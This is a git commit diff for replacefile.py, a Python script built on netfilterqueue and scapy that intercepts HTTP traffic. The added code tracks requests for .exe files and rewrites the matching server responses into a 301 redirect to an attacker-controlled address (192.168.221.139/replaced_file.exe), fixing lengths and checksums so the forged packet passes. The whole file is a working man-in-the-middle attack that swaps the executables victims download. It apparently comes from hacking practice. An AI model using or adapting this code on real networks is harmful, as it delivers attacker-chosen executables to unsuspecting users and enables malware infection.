b418863058208cb6cbf6c3d211a9bd31bf15d7d8
bharath512 <67639106+bharath512@users.noreply.github.com>
2025-01-08 00:27:48 +0530

    Update replacefile.py

--- replacefile.py
+++ replacefile.py
@@ -1,18 +1,27 @@
 #!/usr/bin/python
-
 import netfilterqueue
 import scapy.all as scapy
+
+ack_list = []
 
 def process_packet(packet):
     scapy_packets = scapy.IP(packet.get_payload())
     if scapy_packets.haslayer(scapy.Raw):
         if scapy_packets[scapy.TCP].dport == 80:
-            print ("HTTP request")
             if b".exe" in scapy_packets[scapy.Raw].load:
-                print (scapy_packets.show())
+                ack_list.append(scapy_packets[scapy.TCP].ack)
+                print("EXE request")
         elif scapy_packets[scapy.TCP].sport == 80:
-            print ("HTTP response")
-            print (scapy_packets.show())
+            if scapy_packets[scapy.TCP].seq in ack_list:
+                print("[+] Replacing files....")
+                ack_list.remove(scapy_packets[scapy.TCP].seq)
+                scapy_packets[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.221.139/replaced_file.exe\n\n"
+                del scapy_packets[scapy.IP].len
+                del scapy_packets[scapy.IP].chksum
+                del scapy_packets[scapy.TCP].chksum
+
+                packet.set_payload(bytes(scapy_packets))
+                print(scapy_packets.show())
 
     packet.accept()
 
